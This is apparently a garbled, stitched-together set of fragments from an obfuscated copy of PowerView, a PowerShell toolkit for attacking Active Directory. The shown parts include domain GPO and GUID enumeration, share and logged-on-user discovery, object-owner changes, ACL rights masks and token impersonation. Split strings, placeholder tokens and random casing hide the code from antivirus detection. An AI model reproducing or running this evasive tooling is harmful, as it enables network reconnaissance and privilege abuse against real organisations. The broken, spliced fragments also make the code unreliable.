        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREIJKdEntIAl} =  YoV{jIJKFi}::Z3bEmIJKpTYZ3b,

        [Switch]
        YoV{STOpIJKOnIJKsUCIJKCIJKeSS},

','(Z3b{1}{0}Z3b -f S5z_.*S5z,S5zNOTS5z)) {
                    YoV{uIJKAcfIIJKEld} = YoV{_}.(Z3b{0}{1}{2}Z3b -fS5zSubstS5z,S5zriS5z,S5zngS5z).Invoke(4)
                    YoV{uACVAIJKlIJKUe} = [Int](YoV{uaIJKcenUm}::YoV{uAcIJKFIJKiEIJKld})
                    YoV{fIJKILteR} += Z3b(!(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue))Z3b
                }
                else {
                    YoV{uIJKACvIJKALue} = [Int](YoV{uIJKACEnIJKUm}::YoV{_})
   ','{0}{1}Z3b-f S5zdd-MembeS5z,S5zrS5z,S5zAS5z) (Z3b{0}{2}{1}Z3b -f S5zNoS5z,S5zropertyS5z,S5ztepS5z) (Z3b{2}{3}{0}{1}Z3b-fS5zgS5z,S5zetGuidS5z,S5zTaS5z,S5zrS5z) YoV{IIJKNFO}.Z3bDoIJKmAIIJKNGuidZ3b
                        YoV{DomAIntIJKRIJKUIJKST}.Z3bPSIJKoBjEctZ3b.Z3btIJKypEnAmIJKesZ3b.(Z3b{1}{0}Z3b-f S5zertS5z,S5zInsS5z).Invoke(0, (Z3b{4}{2}{5}{1}{6}{3}{0}Z3b -fS5zPIS5z,S5zTruS5z,S5zwerView.DomaS5z,S5z.AS5z,S5zPoS5z,S5zinS5z,S5zstS5z))
                    ','0, YoV{Co','}{0}{2}Z3b-f S5zw.GPS5z,S5zowerVieS5z,S5zO.RawS5z,S5zPS5z))
                        }
                        else {
                            YoV{_}.Z3bpIJKSobIJKJECtZ3b.Z3btyIJKPIJKEIJKNAMESZ3b.(Z3b{2}{0}{1}Z3b -f S5zsS5z,S5zertS5z,S5zInS5z).Invoke(0, (Z3b{2}{0}{1}Z3b -f S5zrView.GPS5z,S5zOS5z,S5zPoweS5z))
                        }
                        YoV{_}
                    }
                }
            }
            else {
                YoV{IIJKDIJKeIJKNtIIJKTYFilTer} = S5zS5z
                YoV{FIJKilteR} = S5zS5z
                YoV{IDIJKeNTIIJKTy} JGO &(Z3b{1}{3}{2}{0}Z3b -f S5zectS5z,S5zWheS5z,S5z-ObjS5z,S5zreS5z) {YoV{_}} JGO &(Z3b{1}{0}{3}{2}{4}Z3b -fS5zrEaS5z,S5zFoS5z,S5zh-ObjS5z,S5zcS5z,S5zectS5z) {
                    YoV{IIJKdeNtIJKIIJKTyiNSTAnIJKCe} = YoV{_}.(Z3b{1}{0}Z3b-f S5zlaceS5z,S5zRepS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{0}{1}{2}Z3b-fS5zRepS5z,S5zlacS5z,S5zeS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                    if (YoV{IdENIJKTiTyinIJKSTAnIJKce} -match (((Z3b{0}{1}{2}{3}Z3b -fS5zLDAS5z,S5zP:/S5z,S5z/{0}^CN=.S5z,S5z*S5z))  -f  [ChAr]124)) {
                        YoV{idIJKenIJKTITyIJKFilTIJKeR} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                        if ((-not YoV{PsBOUNIJKDpIJKARAmIJKetErs}[(Z3b{0}{1}Z3b-f S5zDoS5z,S5zmainS5z)]) -and (-not YoV{PsBOunIJKDIJKpAIJKRaMEIJKTERS}[(Z3b{2}{1}{0}Z3b-fS5zBaseS5z,S5zearchS5z,S5zSS5z)])) {
                            
                            
                            YoV{IIJKdeNIJKTIJKITYIJKdomAiN} = YoV{IIJKDenIJKTityiNsIJKTANIJKCe}.(Z3b{2}{1}{0}Z3b-fS5zngS5z,S5zStriS5z,S5zSubS5z).Invoke(YoV{iIJKdenTItYIJKINIJKstIJKAIJKNce}.(Z3b{0}{1}Z3b -f S5zInS5z,S5zdexOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                            &(Z3b{1}{3}{2}{0}Z3b -fS5zerboseS5z,S5zWriteS5z,S5zVS5z,S5z-S5z) (S5z[GS5z+S5zeS5z+S5zt-S5z+S5zDomainGPO] S5z+S5zExS5z+S5ztrS5z+S5zacS5z+S5zted S5z+S5zdoS5z+S5zmainS5z+S5z S5z+Z3b','}.(Z3b{1}{0}Z3b-f S5zdAllS5z,S5zFinS5z).Invoke()
            YoV{rIJKeSuIJKLtS} JGO &(Z3b{1}{2}{0}{3}Z3b -fS5z-ObjeS5z,S5zWheS5z,S5zreS5z,S5zctS5z) {YoV{_}} JGO &(Z3b{0}{1}{2}Z3b-f S5zFS5z,S5zorEaS5z,S5zch-ObjectS5z) {
                YoV{GuIJKids}[YoV{_}.Z3bpIJKRoIJKPERTieSZ3b.Z3brIGHTIJKSGuIJKIdZ3b[0].(Z3b{1}{0}{2}Z3b -fS5znS5z,S5ztoStriS5z,S5zgS5z).Invoke()] = YoV{_}.Z3bprOPIJKERtIIJKEsZ3b.Z3bNaIJKMEZ3b[0]
            }
            if (YoV{RESIJKULIJKTS}) {
                try { YoV{reSIJKULTS}.(Z3b{0}{2}{1}Z3b -fS5zdiS5z,S5zposeS5z,S5zsS5z).Invoke() }
                catch {
                    &(Z3b{1}{3}{0}{2}Z3b -fS5zsS5z,S5zWrite-VerS5z,S5zeS5z,S5zboS5z) (S5z[GS5z+S5zet-DomainS5z+S5zGS5z+S5zUIDMaS5z+S5zp] S5z+S5zES5z+S5zrror S5z+S5zdisS5z+S5zposingS5z+S5z S5z+S5zofS5z+S5z S5z+S5ztS5z+S5zhe S5z+S5zResS5z+S5zuS5z+S5zlts S5z+S5zoS5z+S5zbjecS5z+S5zt: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{riGhtssIJKeaRIJKcIJKHEr}.(Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zisposS5z,S5zdS5z).Invoke()
        }
        catch {
            &(Z3b{2}{3}{0}{4}{1}Z3b -fS5zeS5z,S5zoseS5z,S5zWrite-S5z,S5zVS5z,S5zrbS5z) (S5z[GetS5z+S5z-DS5z+S5zomaiS5z+S5znGUIDMap] S5z+S5zErS5z+S5zror S5z+S5ziS5z+S5zn S5z+S5zbuilS5z+S5zdiS5z+S5zng S5z+S5zGUS5z+S5zID S5z+S5zmapS5z+S5z: S5z+Z3bYoV_Z3b)
        }
    }

    YoV{GuIIJKDs}
}


function geIJKT-DOIJKmaInCOIJKMIJKPuTIJKEr {


    [OutputType({Z3b{1}{0}{2}{3}Z3b-f S5zCompS5z,S5zPowerView.S5z,S5zutS5z,S5zerS5z})]
    [OutputType({Z3b{4}{1}{3}{0}{2}Z3b-f S5z.ComS5z,S5zowerS5z,S5zputer.RawS5z,S5zViewS5z,S5zPS5z})]
    [CmdletBinding()]
    Par','JKentiTyFIltIJKER} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{psBOuNdpIJKARAmIJKETIJKEIJKRs}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)]) -and (-not YoV{PsBOUnIJKDIJKPaRaMEIJKTERs}[(Z3b{1}{2}{0}Z3b -fS5zeS5z,S5zSearcS5z,S5zhBasS5z)])) {
                        
                        
                        YoV{iIJKdenIJKTiTyDIJKOMain} = YoV{IDIJKeNtiTYIJKinsIJKTANIJKCE}.(Z3b{2}{0}{1}{3}Z3b -f S5ztS5z,S5zriS5z,S5zSubSS5z,S5zngS5z).Invoke(YoV{idENIJKTIJKIIJKTyInSTaNCE}.(Z3b{0}{1}Z3b-fS5zInS5z,S5zdexOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{2}{0}{1}Z3b -f S5zerS5z,S5zboseS5z,S5zWrite-VS5z) (S5z[Get-DomaS5z+S5zinOS5z+S5zbjS5z+S5zeS5z+S5zct]S5z+S5z S5z+S5zExtrS5z+S5zactS5z+S5zed S5z+S5zdS5z+S5zomaiS5z+S5zn S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfS5z+S5zrom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
    ','
                    YoV{oIJKBJEctIJKSIJKiD} = (&(Z3b{1}{0}{2}Z3b-fS5zew-ObjecS5z,S5zNS5z,S5ztS5z) (Z3b{9}{6}{10}{3}{8}{4}{7}{1}{2}{11}{0}{5}Z3b -f S5zifieS5z,S5zeS5z,S5znS5z,S5zy.PriS5z,S5zSeS5z,S5zrS5z,S5zystS5z,S5zcurityIdS5z,S5zncipal.S5z,S5zSS5z,S5zem.SecuritS5z,S5ztS5z)(YoV{OBJIJKect}.Z3bOBJIJKEIJKcTSIdZ3b[0],0)).Z3bVAIJKlUeZ3b
                }
                else {
                    YoV{ObIJKjecTIJKSID} = YoV{nuIJKlL}
                }

                try {
                    &(Z3b{0}{2}{1}Z3b-f S','               
                YoV{nUIJKLl} = YoV{NEIJKTIJKApIJKI32}::(Z3b{0}{1}{2}{3}Z3b-f S5zNeS5z,S5ztApS5z,S5ziBufS5z,S5zferFreeS5z).Invoke(YoV{pIJKTrInFo})
            }
            else {
                &(Z3b{3}{4}{1}{0}{2}Z3b-fS5zboS5z,S5zerS5z,S5zseS5z,S5zWS5z,S5zrite-VS5z) Z3b[Get-NetShare] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
            }
        }
    }

    END {
        if (YoV{lOGIJKONIJKToKen}) {
            &(Z3b{5}{3}{4}{0}{2}{1}Z3b-fS5zvertToS5z,S5zelfS5z,S5zSS5z,S5z-S5z,S5zReS5z,S5zInvokeS5z) -TokenHandle YoV{lOgOIJKNtOIJKKIJKEN}
        }
    }
}


function GeT-IJKNIJKEIJKTLoggedOn {


    [OutputType({Z3b{0}{6}{4}{5}{2}{1',',S5ztingS5z,S5zrDisS5z,S5zuisheS5z,S5zdNameS5z}, {Z3b{0}{2}{1}Z3b-fS5zMemS5z,S5zrNameS5z,S5zbeS5z})]
        [String[]]
        YoV{iIJKdIJKENTItY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{doIJKmaIJKin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -fS5zFilS5z,S5zterS5z})]
        [String]
        YoV{LDAIJKPIJKFiIJKlTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PRoIJKPeRIJKTIES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-fS5zSPathS5z,S5zADS5z})]
        [String]
        YoV{SeaRCHIJKBAIJKSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{4}{','                  if (-not YoV{siIJKTIJKesEIJKArcHer}) {
                            &(Z3b{1}{2}{0}Z3b-f S5zarningS5z,S5zWS5z,S5zrite-WS5z) (S5z[S5z+S5zGet-S5z+S5zDoS5z+S5zmS5z+S5zainSite] S5z+S5zUS5z+S5znable S5z+S5ztoS5z+S5z S5z+S5zretS5z+S5zrieve S5z+S5zdomaS5z+S5zinS5z+S5z S5z+S5zsS5z+S5zearchS5z+S5zer S5z+S5zfoS5z+S5zr S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                else {
                    try {
                        YoV{GUiDbIJKYTIJKesIJKTRIng} = (-Join (([Guid]YoV{IIJKDIJKenIJKTiTYiNstAIJKNCe}).(','}{4}{7}{5}Z3b -f S5zonfigS5z,S5zCN=SS5z,S5zurS5z,S5zites,S5z,S5zaS5z,S5zonS5z,S5zCN=CS5z,S5ztiS5z)
        }
        if (YoV{psBIJKoIJKUIJKNdPAIJKRaMIJKETeRS}[(Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z)]) { YoV{sEIJKArchIJKErIJKArgUmENTS}[(Z3b{1}{0}Z3b-fS5zmainS5z,S5zDoS5z)] = YoV{DIJKOMIJKAiN} }
        if (YoV{psIJKBouNDPArAMEtIJKEIJKRS}[(Z3b{2}{0}{1}Z3b -f S5zrS5z,S5zopertiesS5z,S5zPS5z)]) { YoV{SIJKeArcHERIJKAIJKRGIJKUMeNts}[(Z3b{0}{2}{1}Z3b-fS5zProS5z,S5zrtiesS5z,S5zpeS5z)] = YoV{PRIJKoPerIJKTIES} }
        if (YoV{PsBOUnDIJKpaIJKRAmIJKETERs}[(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zSS5z,S5zarchBaseS5z)]) { YoV{SearcheRIJKARIJKGuMIJKENtS}[(Z3b{1}{2}{0}Z3b -fS5zchBaseS5z,S5zSeaS5z,S5zrS5z)] = YoV{seIJKArCIJKHBase} }
        if (YoV{PSBoUIJKNIJK','.(Z3b{2}{1}{0}Z3b -f S5zftS5z,S5zLeS5z,S5zPadS5z).Invoke(2,S5z0S5z)})) -Replace (Z3b{0}{1}Z3b -fS5z(..S5z,S5z)S5z),S5z5rjYoV1S5z
                        YoV{IIJKDIJKEnTITyfilIJKTIJKEr} += Z3b(objectguid=YoVGuidByteString)Z3b
                    }
                    catch {
                        YoV{IdeIJKNTitYfIIJKlIJKTeR} += Z3b(name=YoVIdentity','fS5zResuS5z,S5zlS5z,S5zizeS5z,S5zPageSS5z,S5ztS5z)]) { YoV{OIJKBJeCIJKTSeaIJKRCHIJKERAIJKRgumIJKenIJKTS}[(Z3b{3}{0}{2}{1}Z3b -fS5zultPagS5z,S5zSizeS5z,S5zeS5z,S5zResS5z)] = YoV{rIJKesuLIJKTIJKPAGeIJKSIZe} }
        if (YoV{psBoIJKUNdIJKParAmetIJKeRs}[(Z3b{1}{0}{2}Z3b -fS5zrverTimeLimiS5z,S5zSeS5z,S5ztS5z)]) { YoV{objeIJKCTSEarCHErARIJKgUIJKMeNIJKTS}[(Z3b{3}{2}{1}{0}Z3b-f S5zimitS5z,S5zmeLS5z,S5zerTiS5z,S5zServS5z)] = YoV{seIJKRVERIJKTIJKiIJKmIJKElimiT} }
        if (YoV{PIJKsboUnIJKDParaMeIJKTERs}[(Z3b{0}{1}{2}Z3b -fS5zToS5z,S5zmbstoS5z,S5zneS5z)]) { YoV{ObJeIJKCtsEaRCIJKhErIJKARgIJKUmeNIJKTS}[(Z3b{0}{1}{2}Z3b-f S5zTombstS5z,S5zonS5z,S5zeS5z)] = YoV{toMIJKBStIJKoNe} }
        if (YoV{pSBIJKOuIJKNDPARaIJKMEtErs}[(Z3b{0}{2}{1}{3}Z3b -fS5zCredenS5z,S5ziaS5z,S5ztS5z,S5zlS5z)]) { YoV{oBJEcIJKTsEaRIJKcIJKheIJKRArGUMIJKEnts}[(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zCrS5z,S5zdentialS5z)] = YoV{CIJKRIJKEdEntiIJKAL} }

        YoV{aIJKDIJKNAMEARIJKguMEntS} = @{}
        if (YoV{pSbOUNDPaIJKRAIJKMIJKeTIJKeRS}[(Z3b{0}{1}Z3b -fS5zServS5z,S5zerS5z)]) { YoV{AdnaMeAIJKRIJKGIJKUMEnTS}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)] = YoV{SErVIJKEr} }
        if (YoV{psBIJKouNdIJKPAIJKRIJKAMIJKEteRS}[(Z3b{3}{1}{0}{2}Z3b-fS5ztS5z,S5znS5z,S5zialS5z,S5zCredeS5z)]) { YoV{aDNaIJKmeIJKAIJKRguMEIJKNts}[(Z3b{1}{0}{2}Z3b -f S5zedenS5z,S5zCrS5z,S5ztialS5z)] = YoV{CrIJKEdENIJKTIIJKAL} }

        
        YoV{RIJKeSOlvIJKEdsids} = @{}
    }

    PROCESS {
        if (YoV{PsboIJKUNIJKDPIJKAraMEIJKTIJKERS}[(Z3b{1}{0}Z3b-f S5zomainS5z,S5zDS5z)]) {
            YoV{AcLaIJKRguIJKmeIJKNIJKTS}[(Z3b{1}{0}Z3b -fS5zmainS5z,S5zDoS5z)] = YoV{doIJKmAiN}
            YoV{AdIJKNIJKAMIJKEARGumEnTs}[(Z3b{0}{1}Z3b-fS5zDS5z,S5zomainS5z)] = YoV{dIJKOIJKMAIn}
        }

        &(Z3b{2}{0}{1}{5}{3}{4}Z3b-f S5zomS5z,S5zaiS5z,S5zGet-DS5z,S5zctS5z,S5zAclS5z,S5znObjeS5z) @ACLArguments JGO &(Z3b{0}{3}{2}{1}{4}Z3b-fS5zForS5z,S5zh-O','{
                            
                            YoV{MEIJKMbeIJKRIsdoIJKMIJKAin} = YoV{tIJKRue}
                            YoV{nIJKAMe} = YoV{AdSPIJKAIJKTh}.(Z3b{1}{0}Z3b -fS5zplaceS5z,S5zReS5z).Invoke(S5z/S5z, S5z5rjS5z)
                        }
                        else {
                            
                            YoV{MIJKEIJKMBEIJKRisDOmAIJKIn} = YoV{FAIJKLIJKSe}
                            YoV{NIJKAmE} = YoV{aDSIJKpAtH}.(Z3b{2}{0}{1}Z3b-fS5zinS5z,S5zgS5z,S5zSubstrS5z).Invoke(YoV{aDSpIJKATh}.(Z3b{2}{1}{0}Z3b -fS5zOfS5z,S5zdexS5z,S5zInS5z).Invoke(S5z/S5z)+1).(Z3b{2}{1}{0}Z3b -f S5zaceS5z,S5zeplS5z,S5zRS5z).Invoke(S5z/S5z, S5z5rjS5z)
                        }

                        YoV{MEMBIJKEr} JGO &(Z3b{2}{0}{1}Z3b-fS5zd-MeS5z,S5zmberS5z,S5zAdS5z) (Z3b{0}{2}{1}{3}Z3b -fS5zNotepS5z,S5zrS5z,S5zropeS5z,S5ztyS5z) (Z3b{0}{3}{1}{2}Z3b -fS5zAcS5z,S5zunS5z,S5ztNameS5z,S5zcoS5z) YoV{NIJKAMe}
                        YoV{MeIJKmIJKBeR} JGO &(Z3b{2}{0}{1}Z3b-fS5zdd-MemS5z,S5zberS5z,S5zAS5z) (Z3b{2}{1}{3}{0}Z3b-fS5ztyS5z,S5zpropeS5z,S5zNoteS5z,S5zrS5z) S5zSIDS5z ((&(Z3b{2}{3}{1}{0}Z3b-fS5ztS5z,S5zw-ObjecS5z,S5zNS5z,S5zeS5z) (Z3b{0}{4}{7}{3}{2}{6}{1}{5}Z3b -fS5zSystemS5z,S5zfieS5z,S5zdeS5z,S5zityIS5z,S5z.SecS5z,S5zrS5z,S5zntiS5z,S5zurity.Principal.SecurS5z)(YoV{LIJKOCaIJKLUseR}.(Z3b{2}{1}{0}Z3b -fS5zGetS5z,S5zkeS5z,S5zInvoS5z).Invoke((Z3b{0}{3}{2}{1}Z3b -f S5zObjecS5z,S5zDS5z,S5zSIS5z,S5ztS5z)),0)).Z3bVAIJKLUEZ3b)
                        YoV{MEIJKmIJKBeR} JGO &(Z3b{0}{1}{2}{3}Z3b -f S5zAdd-S5z,S5zMeS5z,S5zmbS5z,S5zerS5z) (Z3b{1}{3}{2}{0}Z3b -fS5zpertyS5z,S5zNotS5z,S5zoS5z,S5zeprS5z) (Z3b{1}{0}Z3b-fS5zsGroupS5z,S5zIS5z) YoV{iIJKSGRIJKoUP}
                        YoV{mIJKEMBeR} JGO &(Z3b{2}{1}{0}Z3b -f S5zerS5z,S5zdd-MembS5z,S5zAS5z) (Z3b{0}{1}{2}{3}Z3b -fS5zNS5z,S5zoS5z,S5zteproS5z,S5zpertyS5z) (Z3b{1}{0}{2}Z3b -fS5zsDoS5z,S5zIS5z,S5zmainS5z) YoV{memIJKBEriSDOIJKMIJKAIJKiN}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
              ','  [Int]
        YoV{reIJKSulIJKTIJKPIJKAgEsIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SerIJKVEIJKRTIJKIMelimIJKiT},

        [Switch]
        YoV{tIJKomIJKBsTIJKoNE},

        [Mana','b{0}{2}{4}{3}{1}Z3b-f S5zGenS5z,S5zteS5z,S5zeriS5z,S5zecuS5z,S5zcExS5z)
                [uint32](Z3b{3}{2}{1}{0}Z3b-f S5z0S5z,S5z000000S5z,S5z1S5z,S5z0xS5z) = (Z3b{0}{2}{1}Z3b -fS5zGenerS5z,S5zlS5z,S5zicAlS5z)
                [uint32](Z3b{2}{0}{1}Z3b -f S5z0S5z,S5z00000S5z,S5z0x02S5z) = (Z3b{3}{2}{1}{0}Z3b-f S5zdS5z,S5zweS5z,S5zaximumAlloS5z,S5zMS5z)
                [uint32](Z3b{2}{3}{1}{0}Z3b -fS5z0S5z,S5z100000S5z,S5z0S5z,S5zx0S5z) = (Z3b{4}{5}{3}{0}{2}{1}Z3b-fS5zsSysteS5z,S5zcurityS5z,S5zmSeS5z,S5zcesS5z,S5zAS5z,S5zcS5z)
                [uint32](Z3b{1}{2}{0}Z3b -fS5z0S5z,S5z0x00100S5z,S5z00S5z) = (Z3b{2}{3}{0}{1}Z3b -f S5ziS5z,S5zzeS5z,S5zSynS5z,S5zchronS5z)
                [uint32](Z3b{1}{2}{0}Z3b-f S5z000S5z,S5z0x000S5z,S5z80S5z) = (Z3b{1}{0}{2}Z3b -f S5ziteOwneS5z,S5zWrS5z,S5zrS5z)
                [uint32](Z3b{2}{1}{0}Z3b-f S5z00S5z,S5z00S5z,S5z0x0004S5z) = (Z3b{2}{0}{1}Z3b-fS5zteDS5z,S5zACS5z,S5zWriS5z)
                [uint32](Z3b{2}{1}{3}{0}Z3b-fS5z00S5z,S5z00S5z,S5z0x0S5z,S5z200S5z) = (Z3b{1}{2}{0}Z3b-fS5zolS5z,S5zReadContS5z,S5zrS5z)
                [uint32](Z3b{3}{1}{2}{0}Z3b-f S5z0S5z,S5z00100S5z,S5z0S5z,S5z0x0S5z) = (Z3b{0}{2}{1}Z3b -fS5zDelS5z,S5zeS5z,S5zetS5z)
                [uint32](Z3b{2}{0}{1}Z3b-fS5z0S5z,S5z100S5z,S5z0x0000S5z) = (Z3b{3}{2}{1}{0}Z3b -f S5zibutesS5z,S5zttrS5z,S5zriteAS5z,S5zWS5z)
                [uint32](Z3b{2}{3}{0}{1}Z3b -f S5z08S5z,S5z0S5z,S5z0xS5z,S5z00000S5z) = (Z3b{0}{1}{2}{3}Z3b-f S5zReS5z,S5zadAS5z,S5zttriS5z,S5zbutesS5z)
                [uint32](Z3b{0}{3}{1}{2}Z3b-f S5z0x00S5z,S5z00S5z,S5z40S5z,S5z00S5z) = (Z3b{1}{0}{2}Z3b -f S5zhiS5z,S5zDeleteCS5z,S5zldS5z)
                [uint32](Z3b{1}{0}{2}Z3b-f S5z0000S5z,S5z0xS5z,S5z0020S5z) = (Z3b{4}{2}{3}{0}{1}Z3b-f S5z/TravS5z,S5zerseS5z,S5zcuS5z,S5zteS5z,S5zExeS5z)
                [uint32](Z3b{1}{0}{3}{2}Z3b-fS5z00S5z,S5z0x000S5z,S5z10S5z,S5z0S5z) = (Z3b{3}{0}{4}{1}{2}Z3b -fS5ziteExtendedS5z,S5zibuS5z,S5ztesS5z,S5zWrS5z,S5zAttrS5z)
                [uint32](Z3b{2}{1}{0}Z3b-f S5z00008S5z,S5z00S5z,S5z0x0S5z) = (Z3b{1}{2}{4}{5}{0}{3}Z3b -f S5zeS5z,S5zRS5z,S5zeadES5z,S5zdAttributesS5z,S5zxS5z,S5ztendS5z)
                [uint32](Z3b{2}{0}{1}Z3b -fS5z000S5z,S5z00004S5z,S5z0xS5z) = (Z3b{1}{7}{6}{2}{5}{0}{4}{3}Z3b -f S5zAddSubS5z,S5zAS5z,S5zaS5z,S5zirectoryS5z,S5zdS5z,S5z/S5z,S5zDatS5z,S5zppendS5z)
                [uint32](Z3b{2}{0}{1}Z3b-f S5z00S5z,S5z002S5z,S5z0x000S5z) = (Z3b{1}{0','nAme = YoV{TrIJKUE}, PARaMeterSeTNAMe = Z3bdYNAMicPIJKAraMeIJKTIJKerZ3b)]
        [switch]YoV{VIJKALuIJKeFrOmPiIJKpElIJKiNIJKEbyPrIJKopEIJKRtYnaME},

        [Param','YoV{pSBOuIJKNIJKdPIJKAramEtERS}[(Z3b{2}{3}{0}{1}Z3b -f S5zerTimeLS5z,S5zimitS5z,S5zSeS5z,S5zrvS5z)]) { YoV{SEArChIJKeRIJKARgumIJKenIJKTs}[(Z3b{1}{0}{3}{2}Z3b-f S5zrTS5z,S5zServeS5z,S5zmitS5z,S5zimeLiS5z)] = YoV{seRvErTIMeIJKLIIJKMiT} }
        if (YoV{PSbOUnDIJKPIJKArAmeIJKTErS}[(Z3b{2}{1}{3}{0}Z3b-fS5zeS5z,S5zmbS5z,S5zToS5z,S5zstonS5z)]) { YoV{seArIJKchIJKeRargUMIJKeNtS}[(Z3b{1}{0}Z3b -fS5zeS5z,S5zTombstonS5z)] = YoV{TIJKoIJKMbsToIJKNE} }
        if (YoV{PSBIJKounIJKDPIJKArAMetIJKERs}[(Z3b{0}{1}{2}Z3b-fS5zCreS5z,S5zdenS5z,S5ztialS5z)]) { YoV{SEaRCHErIJKAIJKRGUIJKmeIJKNIJKTs}[(Z3b{1}{0}{2}Z3b-fS5zredentiaS5z,S5zCS5z,S5zlS5z)] = YoV{CrIJKeIJKdentIIJKAl} }

        YoV{oIJKWNERIJKsiD} = &(Z3b{1}{2}{4}{0}{3}Z3b -f S5zainObjecS5z,S5zGeS5z,S5zt-DoS5z,S5ztS5z,S5zmS5z) @SearcherArguments -Identity YoV{oWNeRIJKIIJKDIJKEIJKNtIty} -Properties (Z3b{1}{0}{2}Z3b -f S5zbjS5z,S5zoS5z,S5zectsidS5z) JGO &(Z3b{0}{2}{1}Z3b -f S5zSeS5z,S5z-ObjectS5z,S5zlectS5z) -ExpandProperty (Z3b{1}{0}{2}{3}Z3b -f S5zbjecS5z,S5zoS5z,S5ztS5z,S5zsidS5z)
        if (YoV{oWnIJKErsIJKId}) {
            YoV{owNIJKErIJKiIJKDEIJKNTitIJKyrEFeRENCE} = [System.Security.Principal.SecurityIdentifier]YoV{ownIJKERsIJKId}
        }
        else {
            &(Z3b{2}{1}{0}Z3b-fS5zngS5z,S5zrniS5z,S5zWrite-WaS5z) (S5z[S5z+S5zSetS5z+S5z-DoS5z+S5zmainS5z+S5zO','JKsIZe} }
        if (YoV{PsbouIJKNDpAIJKRAMetIJKEIJKRS}[(Z3b{3}{4}{1}{0}{2}Z3b-fS5zeLiS5z,S5zrTimS5z,S5zmitS5z,S5zSeS5z,S5zrveS5z)]) { YoV{SEaIJKRcHeRAIJKRgIJKUmeIJKNtS}[(Z3b{0}{2}{1}{3}Z3b-fS5zServerTimeS5z,S5zmiS5z,S5zLiS5z,S5ztS5z)] = YoV{seRVerTIJKIIJKmeIJKLiMiT} }
        if (YoV{PSboUnIJKdpARIJKAIJKMIJKETers}[(Z3b{2}{1}{0}Z3b-fS5zbstoneS5z,S5zomS5z,S5zTS5z)]) { YoV{SIJKEARchEIJKRARIJKGUIJKMIJKeNtS}[(Z3b{3}{0}{1}{2}Z3b-fS5zbS5z,S5zstonS5z,S5zeS5z,S5zTomS5z)] = YoV{TIJKOMBsIJKTOnE} }
        if (YoV{PIJKSBoI','{ComPuIJKTIJKeRSeaIJKRcIJKHerArgIJKUmeNtS}[(Z3b{2}{3}{0}{1}Z3b-f S5zystS5z,S5zemS5z,S5zOperatingS5z,S5zSS5z)] = YoV{OpeIJKRatiNGsIJKysIJKTEm} }
        if (YoV{PIJKSboUnDPIJKAIJKRAMEters}[(Z3b{3}{1}{0}{2}Z3b -fS5zuterServicePacS5z,S5zmpS5z,S5zkS5z,S5zCoS5z)]) { YoV{coIJKmpUTIJKerSEAIJKRIJKcIJKhIJKEIJKRaRguMENts}[(Z3b{0}{1}{3}{2}Z3b -f S5zServS5z,S5zicS5z,S5zPackS5z,S5zeS5z)] = YoV{SIJKerViIJKcEpAck} }
        if (YoV{psBIJKOIJKUNdPaRaMEIJKTIJKeRs}[(Z3b{0}{1}{2}Z3b-f S5zComputeS5z,S5zrSiteS5z,S5zNameS5z)]) { YoV{CoMPUtIJKeIJKRIJKsEArcherIJKArGIJKUmIJKentS}[(Z3b{0}{1}Z3b -f S5zSiteNamS5z,S5zeS5z)] = YoV{SITenIJKAmE} }
        if (YoV{PsIJKBoUnDIJKpArAIJKmeTeIJKRs}[(Z3b{0}{1}Z3b -fS5zSerS5z,S5zverS5z)]) { YoV{coMPuTIJKErIJKSIJKeaRchIJKERArIJKgUMeIJKNts}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)] = YoV{SEIJKRIJKVER} }
        if (YoV{PIJKsBIJKouIJKNDparIJKAMEtERs}[(Z3b{0}{2}{1}Z3b-fS5zSS5z,S5zarchScopeS5z,S5zeS5z)]) { YoV{ComPUtersEIJKARcIJKHIJKEraIJKRIJKGumEIJKNIJKTs}[(Z3b{1}{0}{2}Z3b -f S5zhSS5z,S5zSearcS5z,S5zcopeS5z)] = YoV{seArIJKcHScIJKoIJKPe} }
        if (YoV{pSbOIJKUNIJKdIJKparIJKAmETerS}[(Z3b{0}{3}{2}{1}Z3b-f S5zResS5z,S5zeSizeS5z,S5zltPagS5z,S5zuS5z)]) { YoV{coMPuTeIJKRsEIJKARIJKCHeIJKRIJKAIJKRGuIJKmEIJKNts}[(Z3b{1}{0}{3}{2}Z3b -fS5zaS5z,S5zResultPS5z,S5zzeS5z,S5zgeSiS5z)] = YoV{rEsULTPIJKAGeIJKSiZe} }
